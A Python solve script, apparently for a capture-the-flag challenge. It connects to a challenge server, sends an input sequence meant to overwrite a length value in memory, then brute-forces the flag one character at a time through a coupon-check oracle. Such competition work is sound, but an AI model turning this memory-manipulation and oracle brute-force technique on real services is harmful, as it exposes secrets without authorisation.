import time
import socket
import string

# Each time send one more char and overide the len var in memory to size+1

APPLY_COUPON=5

# netcat config, opens a socket
port=2222
host_name="csa-2.csa-challenge.com"
ip=socket.gethostbyname(host_name)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

# Add the found letter to the string each time manually
flag="CSA{"
char_index=len(flag) + 1

# Adjusting length using amount_loaves
startSequnce=f"5a\n2\n2\n4\n{char_index}\n2\n2\n3\n0\n2\n2\n"

s.sendall(startSequnce.encode())
time.sleep(1)
data = s.recv(1024*2).decode()

for char in string.printable:
    partial_flag=flag+char
    print(char,partial_flag)
    s.sendall(f'{APPLY_COUPON}\n{partial_flag}\n'.encode())
    data = s.recv(1024).decode()
    print(data)
    # Check if the char is ok
    if "Applied" in data:
        print("match found !",char,partial_flag)
        break

s.close()


